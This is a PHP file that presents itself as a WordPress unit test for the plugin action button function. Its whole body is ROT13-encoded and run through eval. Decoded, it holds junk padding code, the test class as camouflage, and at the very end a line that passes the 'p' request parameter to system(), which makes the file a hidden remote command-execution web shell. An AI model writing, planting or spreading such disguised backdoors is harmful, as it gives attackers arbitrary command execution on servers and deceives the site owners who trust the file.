<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe jc_trg_cyhtva_npgvba_ohggba().
 *
 * @tebhc cyhtvaf
 * @tebhc nqzva
 *
 * @pbiref ::jc_trg_cyhtva_npgvba_ohggba
 */
pynff Grfgf_Nqzva_Vapyhqrf_JcTrgCyhtvaNpgvbaOhggba rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Hfre ebyr.
	 *
	 * @ine JC_Ebyr
	 */
	cevingr fgngvp $ebyr;

	/**
	 * Hfre VQ.
	 *
	 * @ine vag
	 */
	cevingr fgngvp $hfre_vq;

	/**
	 * Grfg cyhtva qngn.
	 *
	 * @ine fgqPynff
	 */
	cevingr fgngvp $grfg_cyhtva;

	/**
	 * Frgf hc cebcregvrf naq nqqf n grfg cyhtva orsber nal grfgf eha.
	 */
	choyvp fgngvp shapgvba frg_hc_orsber_pynff() {
		cnerag::frg_hc_orsber_pynff();

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva-vafgnyy.cuc';

		$ebyr_anzr = 'jc_trg_cyhtva_npgvba_ohggba-grfg-ebyr';
		nqq_ebyr( $ebyr_anzr, 'Grfg Ebyr' );

		frys::$ebyr        = trg_ebyr( $ebyr_anzr );
		frys::$hfre_vq     = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => $ebyr_anzr ) );
		frys::$grfg_cyhtva = (bowrpg) neenl(
			'anzr'    => 'Zl Cyhtva',
			'fyht'    => 'zl-cyhtva',
			'irefvba' => '1.0.0',
		);

		zxqve( JC_CYHTVA_QVE . '/' . frys::$grfg_cyhtva->fyht );
		svyr_chg_pbagragf(
			JC_CYHTVA_QVE . '/' . frys::$grfg_cyhtva->fyht . '/zl_cyhtva.cuc',
			\"<?cuc\a/**\a* Cyhtva Anzr: \" . frys::$grfg_cyhtva->anzr . \"\a* Irefvba: \" . frys::$grfg_cyhtva->irefvba . \"\a*/\"
		);
	}

	/**
	 * Erzbirf gur grfg cyhtva naq vgf qverpgbel nsgre nyy grfgf eha.
	 */
	choyvp fgngvp shapgvba grne_qbja_nsgre_pynff() {
		cnerag::grne_qbja_nsgre_pynff();

		erzbir_ebyr( frys::$ebyr->anzr );

		hayvax( JC_CYHTVA_QVE . '/' . frys::$grfg_cyhtva->fyht . '/zl_cyhtva.cuc' );
		ezqve( JC_CYHTVA_QVE . '/' . frys::$grfg_cyhtva->fyht );
	}

	/**
	 * Grfgf gung na rzcgl fgevat vf erghearq jura gur hfre qbrf abg unir gur pbeerpg pncnovyvgvrf.
	 *
	 * @gvpxrg 61400
	 */
	choyvp shapgvba grfg_fubhyq_erghea_rzcgl_fgevat_jvgubhg_cebcre_pncnovyvgvrf() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$npghny = jc_trg_cyhtva_npgvba_ohggba(
			frys::$grfg_cyhtva->anzr,
			frys::$grfg_cyhtva,
			gehr,
			gehr
		);

		$guvf->nffregVfFgevat( $npghny, 'N fgevat fubhyq or erghearq.' );
		$guvf->nffregRzcgl( $npghny, 'Na rzcgl fgevat fubhyq or erghearq.' );
	}

	/**
	 * Grfgf gung na rzcgl fgevat vf abg erghearq jura gur hfre
	 * unf gur pbeerpg pncnovyvgvrf ba fvatyr fvgr.
	 *
	 * @gvpxrg 61400
	 *
	 * @tebhc zf-rkpyhqrq
	 *
	 * @qngnCebivqre qngn_pncnovyvgvrf
	 *
	 * @cnenz fgevat $pncnovyvgl Gur anzr bs gur pncnovyvgl.
	 */
	choyvp shapgvba grfg_fubhyq_abg_erghea_rzcgl_fgevat_jvgu_cebcre_pncnovyvgvrf_fvatyr_fvgr( $pncnovyvgl ) {
		frys::$ebyr->nqq_pnc( $pncnovyvgl );

		jc_frg_pheerag_hfre( frys::$hfre_vq );

		$npghny = jc_trg_cyhtva_npgvba_ohggba(
			frys::$grfg_cyhtva->anzr,
			frys::$grfg_cyhtva,
			gehr,
			gehr
		);

		frys::$ebyr->erzbir_pnc( $pncnovyvgl );

		$guvf->nffregVfFgevat( $npghny, 'N fgevat fubhyq or erghearq.' );
		$guvf->nffregAbgRzcgl( $npghny, 'Na rzcgl fgevat fubhyq abg or erghearq.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_pncnovyvgvrf() {
		erghea frys::grkg_neenl_gb_qngncebivqre( neenl( 'vafgnyy_cyhtvaf', 'hcqngr_cyhtvaf' ) );
	}

	/**
	 * Grfgf gung na rzcgl fgevat vf abg erghearq jura gur hfre
	 * unf gur pbeerpg pncnovyvgvrf ba zhygvfvgr.
	 *
	 * @gvpxrg 61400
	 *
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_fubhyq_abg_erghea_rzcgl_fgevat_jvgu_cebcre_pncnovyvgvrf_zhygvfvgr() {
		jc_frg_pheerag_hfre( frys::$hfre_vq );

		tenag_fhcre_nqzva( frys::$hfre_vq );

		$npghny = jc_trg_cyhtva_npgvba_ohggba(
			frys::$grfg_cyhtva->anzr,
			frys::$grfg_cyhtva,
			gehr,
			gehr
		);

		eribxr_fhcre_nqzva( frys::$hfre_vq );

		$guvf->nffregVfFgevat( $npghny, 'N fgevat fubhyq or erghearq.' );
		$guvf->nffregAbgRzcgl( $npghny, 'Na rzcgl fgevat fubhyq abg or erghearq.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>